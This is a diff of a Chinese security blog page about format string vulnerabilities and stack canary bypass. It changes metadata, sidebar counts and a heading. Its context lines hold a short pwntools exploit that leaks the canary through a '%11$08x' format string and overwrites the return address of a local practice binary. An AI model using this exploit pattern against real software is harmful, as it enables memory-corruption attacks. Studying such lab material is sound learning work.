@@ -98,7 +98,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/python.png">
 <meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/%E7%A1%AE%E5%AE%9A">
 <meta property="og:image" content="http://yoursite.com/2020/03/29/格式化字符串漏洞与canary保护/%E5%B0%8F%E7%AB%AF%E5%AD%98%E5%82%A8.png">
-<meta property="og:updated_time" content="2020-04-08T06:43:43.112Z">
+<meta property="og:updated_time" content="2020-04-08T12:47:45.392Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="格式化字符串与canary保护">
 <meta name="twitter:description" content="格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把输入当作第一个参数直接输出的时候，输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容">
@@ -401,7 +401,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%11$8x</span><br></pre></td></tr></table></figure>
 
 <p>一直n下去直到printf函数：<br><img src="/2020/03/29/格式化字符串漏洞与canary保护/canary1.png" alt><br>获得了canary的值，并以16进制形式输出。</p>
-<p>python代码：</p>
+<p>exp：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./test.exe&quot;)</span><br><span class="line">p.sendline(&quot;%11$08x&quot;)</span><br><span class="line">canary=p.recv()[:8]</span><br><span class="line">print(canary)</span><br><span class="line"></span><br><span class="line">canary=canary.decode(&quot;hex&quot;)[::-1]</span><br><span class="line"></span><br><span class="line">coffset=4*4</span><br><span class="line">roffset=3*4</span><br><span class="line">raddr=p32(0x8049192)</span><br><span class="line">payload=coffset*&apos;a&apos;+canary+roffset*&apos;a&apos;+raddr</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/03/29/格式化字符串漏洞与canary保护/python.png" alt></p>
@@ -565,7 +565,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">35</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -576,7 +576,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -587,7 +587,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
